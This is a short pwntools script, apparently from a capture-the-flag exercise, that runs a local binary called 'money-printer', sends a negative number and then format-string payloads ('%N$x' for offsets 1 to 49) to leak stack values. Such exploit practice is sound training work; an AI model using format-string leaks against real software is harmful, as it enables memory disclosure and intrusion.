```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./money-printer')
    io.sendline("-1000")
    payload = f'%{i}$x'
    io.sendline(payload)
    print(io.recvall())
    
    
```
